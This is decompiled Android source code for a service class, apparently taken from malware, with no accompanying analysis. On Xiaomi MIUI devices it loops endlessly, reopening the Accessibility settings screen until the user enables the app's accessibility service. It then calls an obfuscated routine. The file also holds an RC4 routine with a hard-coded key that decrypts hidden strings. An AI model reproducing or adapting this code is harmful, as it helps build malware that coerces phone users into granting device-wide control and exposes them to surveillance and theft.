/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build
 *  android.os.IBinder
 *  android.util.Base64
 */
package com.example.mmm.unused;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvWhileWorker;
import com.example.mmm.Utils.utils;
import com.example.mmm.Utils.utils2;
import com.example.mmm.constants;

public class UnusedService
extends Service {
    utils template$;
    utils2 comic$;
    constants calling$;
    private String updated$;

    public UnusedService() {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(srvWhileWorker.class.getSimpleName());
        stringBuilder.append("   ");
        this.updated$ = stringBuilder.toString();
        this.template$ = new utils();
        this.comic$ = new utils2();
        this.calling$ = new constants();
    }

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public int onStartCommand(Intent intent, int n2, int n3) {
        if (!"xiaomi".equalsIgnoreCase(Build.MANUFACTURER)) return n2;
        if (utils.getMiuiVersion() < 10) return n2;
        do {
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                if (this.template$.SettingsRead((Context)this, "XB").equals("1")) return n2;
            }
            utils.chalkTile(1000);
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                this.comic$._cornell((Context)this);
                continue;
            }
            this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS").addFlags(268435456).addFlags(536870912).addFlags(1073741824));
        } while (true);
    }
}

